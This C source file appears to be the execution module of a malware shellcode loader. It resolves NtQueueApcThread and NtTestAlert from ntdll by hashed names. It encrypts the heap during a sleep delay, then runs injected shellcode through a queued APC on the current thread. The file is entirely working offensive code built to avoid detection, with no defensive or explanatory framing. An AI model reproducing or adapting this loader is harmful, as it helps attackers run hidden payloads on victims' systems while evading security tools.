#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"



BOOL execution_load_apis() {
    g_ldr->apis->NtQueueApcThread = (pNtQueueApcThread)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTQUEUEAPCTHREAD);
    g_ldr->apis->NtTestAlert = (pNtTestAlert)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTTESTALERT);

    return g_ldr->apis->NtQueueApcThread && g_ldr->apis->NtTestAlert;
}


BOOL execution_run(MemoryInfo memInfo) {
    HANDLE hThread = (HANDLE)-2;  
    ldr_sleep_encrypt_heap(g_ldr->config->DelayBefore, memInfo.ShellCodeAddress, memInfo.BytesWrote);

    NTSTATUS status = g_ldr->apis->NtQueueApcThread(
        hThread, memInfo.ShellCodeAddress, NULL, NULL, NULL);
    if (status != 0) {
        DBGA("[!] NtQueueApcThread failed | 0x%lx\n", status);
        return FALSE;
    }

    g_ldr->apis->NtTestAlert();

    return TRUE;
}